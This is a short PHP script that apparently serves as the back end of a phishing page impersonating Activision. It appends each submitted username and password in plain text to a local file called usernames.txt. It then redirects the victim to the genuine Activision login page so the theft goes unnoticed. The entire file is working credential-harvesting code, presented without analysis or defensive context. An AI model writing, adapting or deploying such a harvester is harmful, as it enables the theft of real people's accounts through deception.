<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://s.activision.com/activision/login?redirectUrl=https%3A%2F%2Fwww.activision.com%2F');
exit();
